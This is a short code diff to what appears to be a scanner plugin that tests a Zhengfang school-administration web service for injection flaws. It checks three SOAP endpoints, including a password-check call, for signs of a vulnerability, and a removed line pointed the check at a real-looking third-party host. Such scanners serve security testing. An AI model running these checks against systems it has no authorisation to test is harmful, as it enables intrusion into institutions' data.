@@ -64,12 +64,16 @@ SOAPAction: "http://www.zf_webservice.com/BMCheckPassword"
     code3, head3,res3, errcode3, _ = curl.curl2(url3,raw=raw3)
     if code1==200 and 'testvul' in res1:
         security_hole("GetStuCheckinInfo injection  %s" % target)
+        return target
     if code2==200 and '<checkFileResult>true</checkFileResult>' in res2:
         security_hole("checkFile injection  %s" % target)
+        return target
     if code3==200 and "type=\"xsd:int\">5</BMCheckPasswordResult><xh xsi:type=\"xsd:string\">jwc01</xh>" in res3:
-        security_hole('BMCheckPassword inject %s' % target) 
+        security_hole('BMCheckPassword inject %s' % target)
+        return target
 def audit(arg):
     SendRtx(arg)
-if __name__ == '__main__':
-  from dummy import *
-  audit(assign('zhengfang','http://zfsoft.jlmpc.cn/')[1])
+
+
+if __name__== '__main__':
+    from dummy import *
